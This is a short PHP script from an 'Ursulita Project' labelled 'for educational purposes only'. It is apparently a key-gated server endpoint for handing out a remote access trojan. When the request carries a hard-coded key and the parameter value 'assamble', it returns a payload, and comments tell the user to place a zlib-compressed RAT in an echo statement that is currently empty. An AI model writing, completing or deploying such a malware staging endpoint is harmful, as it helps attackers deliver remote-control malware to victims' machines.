<?php
/**
 * @Ursulita Project for educational purposes only.
 * @author Alaa Abdulridha
 * @copyright 2019
 * @Contact: https://alaa.blog
*/




//Activate this is you want to allow for one IP to connect to the API only.
#$IP_ = array("67.23.245.191");
#if (!in_array($_SERVER['REMOTE_ADDR'], $IP_)) {
#  	echo("no access sorry ..");
#    exit();
#}


#####
$api_key = $_GET['key'];
#####
switch ($api_key) {




##########################
##########################

case"ursulita".sha1("3433"): //The API key validation
		
			$post_uname = $_GET['pp'];
			$payload = 'assamble';
			  if($post_uname == $payload){ // down here you should put the zlib compressed RAT.
		              echo (""); //Put your RAT here
                      return true;
              
			  }	
break;

   
}


?>